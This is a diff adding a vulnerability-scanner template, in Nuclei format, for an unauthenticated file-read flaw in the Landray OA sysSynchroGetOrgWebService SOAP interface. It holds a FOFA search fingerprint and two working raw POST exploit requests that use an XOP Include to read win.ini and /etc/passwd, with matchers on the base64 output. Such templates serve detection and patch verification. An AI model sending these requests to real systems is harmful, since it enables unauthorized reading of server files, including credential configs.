@@ -1,0 +1,88 @@
+id: Landray-WebService-sysSynchroGetOrgWebService-File-reading
+
+info:
+  name: 蓝凌OA sysSynchroGetOrgWebService WebService 文件读取漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="Com_Parameter"
+    蓝凌OA sysSynchroGetOrgWebService WebService 接口存在文件读取漏洞。攻击者无需身份验证即可通过构造恶意请求访问受限文件系统资源，包括但不限于数据库配置文件、系统配置文件等敏感数据，可能造成系统凭证泄露和业务逻辑被篡改。该漏洞允许远程获取服务器关键配置信息，进而为后续攻击提供入口。
+  reference:
+  - https://mp.weixin.qq.com/s/n_i6ScyL0I08HQ68WTBM5w?token=1066715859&lang=zh_CN
+  tags: 蓝凌OA
+
+http:
+- raw:
+  - |
+    POST /sys/webservice/sysSynchroGetOrgWebService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+    Connection: close
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+    SOAPAction: ""
+    Accept-Encoding: gzip, deflate
+
+    ------4upt9dwdca8rtwq9osuz
+    Content-Disposition: form-data; name="a"
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://out.webservice.organization.sys.kmss.landray.com/">
+    <soapenv:Header/>
+    <soapenv:Body>
+        <web:getOrgStaffingLevelInfo>
+            <arg0>
+                <beginTimeStamp>a</beginTimeStamp>
+                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+            </arg0>
+        </web:getOrgStaffingLevelInfo>
+    </soapenv:Body>
+    </soapenv:Envelope>
+    ------4upt9dwdca8rtwq9osuz--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0'
+    - 'Unmarshalling Error: Not a number'
+    condition: and
+  - type: status
+    status:
+    - 500
+- raw:
+  - |
+    POST /sys/webservice/sysSynchroGetOrgWebService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+    Connection: close
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+    SOAPAction: ""
+    Accept-Encoding: gzip, deflate
+
+    ------4upt9dwdca8rtwq9osuz
+    Content-Disposition: form-data; name="a"
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://out.webservice.organization.sys.kmss.landray.com/">
+    <soapenv:Header/>
+    <soapenv:Body>
+        <web:getOrgStaffingLevelInfo>
+            <arg0>
+                <beginTimeStamp>a</beginTimeStamp>
+                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></count>
+            </arg0>
+        </web:getOrgStaffingLevelInfo>
+    </soapenv:Body>
+    </soapenv:Envelope>
+    ------4upt9dwdca8rtwq9osuz--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'cm9vdDov'
+    - 'L2Jpbi9iYXNo'
+    - 'Unmarshalling Error: Not a number'
+    condition: and
+  - type: status
+    status:
+    - 500
+
